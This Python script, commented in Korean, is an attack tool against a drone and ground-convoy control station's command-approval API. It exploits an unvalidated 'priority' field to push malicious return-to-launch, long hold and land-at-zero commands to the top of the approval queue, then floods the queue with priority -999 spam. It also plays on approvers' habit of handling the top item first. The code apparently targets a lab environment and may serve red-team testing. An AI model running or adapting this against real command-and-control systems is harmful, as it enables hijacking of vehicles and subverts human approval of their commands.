"""
Command Priority Escalation — 커맨드 우선순위 탈취 공격
독창 시나리오 #15 | arXiv:2308.14203 "Priority Inversion Attacks on C2 Systems"

GCS 취약점 (state.py:515):
  "priority": int(payload.get("priority", 3)),  # ← 범위 검증 없음

priority 필드는 임의 정수 허용 (음수, 0, 매우 큰 수 모두 가능)

공격 전략:
  Phase 1 (정상 커맨드 주입):  priority=3 (기본) 으로 정상 커맨드 제출
  Phase 2 (최고 우선순위 탈취): priority=0 (또는 음수)으로 악의적 커맨드 제출
                               → 승인 목록 최상단에 배치
                               → 승인자가 무의식적으로 최상단 항목 먼저 처리
  Phase 3 (스택 오염):         priority=-999 으로 정상 커맨드 처리 순서 역전

부가 효과:
  - 긴급 정상 커맨드(priority=1)보다 공격 커맨드(priority=0)가 먼저 처리
  - 승인자가 목록 상단에 집중하는 UX 습관 악용
"""
from __future__ import annotations

import argparse
import time
import random
from .common import GcsClient, wait_for_gcs

# 정찰로 확인된 합법 자산 ID
TARGET_ASSETS = ["small-dronebot-01", "ground-convoy-01"]

# 악의적 커맨드 타입 (GCS가 허용하는 표준 타입 사용 → 화이트리스트 통과)
ATTACK_COMMANDS = [
    ("return_to_launch", {"reason": "attacker_initiated"}),
    ("hold_position",    {"hold_duration_s": 9999}),
    ("land",             {"target_lat": 0.0, "target_lon": 0.0}),
]


def _inject_priority_command(
    client: GcsClient,
    asset_id: str,
    command_type: str,
    params: dict,
    priority: int,
    label: str,
) -> str | None:
    """우선순위 조작 커맨드 주입, command_id 반환"""
    try:
        resp = client.post("/api/commands/request", {
            "asset_id":     asset_id,
            "command_type": command_type,
            "params":       params,
            "requested_by": f"PRIORITY-ESCALATION:{label}",
            "priority":     priority,
        })
        p = resp.get("payload", resp)
        cid = p.get("command_id")
        print(
            f"[priority_esc] ★ 우선순위 {priority} 커맨드 주입 성공\n"
            f"  command_id={cid} asset={asset_id} type={command_type}",
            flush=True,
        )
        return cid
    except Exception as e:
        print(f"[priority_esc] 주입 오류 (priority={priority}): {e}", flush=True)
        return None


def _check_queue(client: GcsClient) -> list[dict]:
    """현재 pending 커맨드 큐 확인 (우선순위 순 정렬 여부 확인용)"""
    try:
        resp = client.get("/api/commands")
        cmds = resp.get("payload", resp).get("commands", [])
        pending = [c for c in cmds if c.get("status") == "pending_approval"]
        return sorted(pending, key=lambda x: x.get("priority", 3))
    except Exception:
        return []


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="Command Priority Escalation 공격")
    parser.add_argument("--service-url",     default="http://dah-gcs:8080")
    parser.add_argument("--attack-priority", type=int, default=0,
                        help="공격 커맨드 우선순위 (기본 0 = 최고 우선순위)")
    parser.add_argument("--spam-priority",   type=int, default=-999,
                        help="큐 오염용 스팸 우선순위")
    parser.add_argument("--inject-count",    type=int, default=5,
                        help="우선순위 탈취 커맨드 주입 수")
    parser.add_argument("--interval-s",      type=float, default=3.0)
    parser.add_argument("--duration-s",      type=float, default=90.0)
    args = parser.parse_args(argv)

    client = GcsClient(args.service_url)
    wait_for_gcs(client)

    print(
        f"[priority_esc] Command Priority Escalation 시작\n"
        f"  공격 priority: {args.attack_priority} (기본값 3보다 낮음 → 상위 우선)\n"
        f"  스팸 priority: {args.spam_priority} (큐 정렬 파괴)\n"
        f"  주입 수: {args.inject_count}건\n"
        f"  취약점: state.py priority=int(payload) 범위 검증 없음",
        flush=True,
    )

    start = time.time()
    tick = 0
    injected_ids: list[str] = []

    while (time.time() - start) < args.duration_s:
        asset = TARGET_ASSETS[tick % len(TARGET_ASSETS)]
        cmd_type, params = random.choice(ATTACK_COMMANDS)

        if tick < args.inject_count:
            # Phase 1: 최고 우선순위 탈취 커맨드 주입
            cid = _inject_priority_command(
                client, asset, cmd_type, params,
                priority=args.attack_priority,
                label=f"hijack-{tick:02d}",
            )
            if cid:
                injected_ids.append(cid)

        elif tick == args.inject_count:
            # Phase 2: 큐 오염 (priority=-999 으로 정렬 파괴)
            print(f"\n[priority_esc] Phase 2 — 큐 오염 시작 (priority={args.spam_priority})", flush=True)
            for i in range(3):
                _inject_priority_command(
                    client, asset, "hold_position", {"hold_duration_s": 1},
                    priority=args.spam_priority,
                    label=f"spam-{i}",
                )

        # 큐 상태 확인
        if tick % 3 == 0:
            pending = _check_queue(client)
            if pending:
                top = pending[0]
                print(
                    f"[priority_esc] 큐 최상단: priority={top.get('priority')} "
                    f"type={top.get('command_type')} "
                    f"by={top.get('requested_by')}",
                    flush=True,
                )

        tick += 1
        time.sleep(args.interval_s)

    print(f"[priority_esc] 종료 — 주입 command_id: {injected_ids}", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
